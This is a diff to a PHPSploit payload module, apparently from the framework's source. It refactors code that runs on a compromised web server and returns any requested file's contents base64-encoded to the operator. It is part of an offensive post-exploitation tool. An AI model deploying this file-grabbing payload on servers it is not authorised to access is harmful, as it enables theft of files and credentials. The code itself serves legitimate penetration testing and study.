@@ -1,17 +1,18 @@
 <?php
 
-if (@file_exists($Q['FILE'])){
-    if ((@fileperms($Q['FILE']) & 0x8000) == 0x8000){
-        if ($h = @fopen($Q['FILE'],'r')){
-            $size = @filesize($Q['FILE']);
-            if ($size == '0') return '';
-            else {
-                if ($data = fread($h,$size)){
-                    return base64_encode($data);}
-                else return error('noread');}
-            fclose($h);}
-        else return error('noread');}
-    else return error('notafile');}
-else return error('noexists');
+// Check if the file exists
+if (!@file_exists($PHPSPLOIT['FILE']))
+    return error("%s: No such file or directory", $PHPSPLOIT['FILE']);
+
+// If the path is not a regular file, throw error.
+if ((@fileperms($PHPSPLOIT['FILE']) & 0x8000) != 0x8000)
+    return error("%s: Not a file", $PHPSPLOIT['FILE']);
+
+// Get file contents, or throw error (unreadable file).
+if (($data = @file_get_contents($PHPSPLOIT['FILE'])) === False)
+    return error("%s: Permission denied", $PHPSPLOIT['FILE']);
+
+// Return the file data (in base64 format)
+return base64_encode($data);
 
 ?>
